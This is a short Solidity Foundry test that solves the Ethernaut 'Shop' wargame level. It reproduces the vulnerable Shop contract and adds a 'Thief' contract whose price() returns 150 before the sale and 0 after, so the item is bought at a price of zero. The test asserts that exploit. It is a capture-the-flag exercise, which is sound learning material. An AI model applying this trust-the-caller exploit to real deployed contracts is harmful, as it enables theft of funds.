//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Thief is Test {

    Shop shop;

    function setUp() public {
        shop = new Shop();
    }

    //for etehrnaut only
    constructor(address $your_ethernaut_address_here) {
        shop = Shop($your_ethernaut_address_here);
    }

    function testSteal() public {
        shop.buy();
        assertEq(shop.isSold(), true);
        assertEq(shop.price(), 0);
    }

    function price() public view returns (uint juke) {
        bool isSold = shop.isSold();
        if (!isSold) { return 150; }
        if (isSold) { return 0; }
    }
}